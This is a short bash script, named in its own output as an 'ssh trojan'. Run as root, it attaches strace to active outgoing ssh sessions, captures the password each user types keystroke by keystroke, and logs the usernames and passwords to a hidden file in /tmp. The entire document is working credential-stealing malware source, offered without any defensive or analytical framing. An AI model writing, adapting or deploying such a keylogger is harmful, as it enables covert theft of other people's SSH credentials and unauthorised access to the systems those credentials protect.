#!/bin/bash

log_file="/tmp/.log_sshtrojan2.txt"
username=""
password=""

#root check
if [[ "$EUID" -ne 0 ]]; then
    echo "Root required!"
    exit 1
fi

#check if the file exist, if not, creat it
if ! [ -e $log_file ]; then
    touch $log_file
fi

echo "ssh trojan logging username and password..."

while true
do
	#parse pid
	pid=`ps aux | grep -w ssh | grep @ | tail -n1 | awk {' print $2 '}` 
    
	#check if PID not null
    if [[ $pid != "" ]]
	then
		#parse ps ssh process to get username 
        username=`ps aux | grep ssh | grep @ | awk '{ print $12 }' | cut -d'@' -f1 | tail -n1`
        
		#execute command 
        strace -p $pid -e trace=read --status=successful 2>&1 | while read -r line
		do
			# parse password 
			ch=`echo $line | grep read\(4 | cut -d'"' -f2 | cut -d'"' -f1`
			if [[ $ch == "\\n" || $ch == "\\r" ]]; then
				echo "Time: " `date` >> $log_file
				echo "username :" $username  >> $log_file
				echo -e "password: " $password "\n" >> $log_file
				
				break
			else
				password+=$ch
			fi           
        done
    fi
done


